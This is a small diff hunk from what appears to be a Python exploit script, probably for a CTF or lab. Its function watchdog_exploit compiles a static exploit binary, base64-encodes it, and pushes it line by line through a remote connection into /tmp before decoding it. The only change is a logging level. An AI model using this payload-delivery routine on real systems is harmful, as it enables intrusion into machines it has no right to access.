@@ -55,7 +55,7 @@ def watchdog_exploit(conn):
     system("musl-gcc -Os -static -s -o wexp watchdog_exploit.c")
     system("base64 wexp > wexp.b64")
     watchdog = open("wexp.b64", "r").read().split("\n")
-    context.log_level = "none"
+    context.log_level = "critical"
     for line in watchdog:
         conn.sendline(f"echo {line} >> /tmp/wexp.b64")
     conn.sendline("base64 -d /tmp/wexp.b64 > /tmp/wexp")
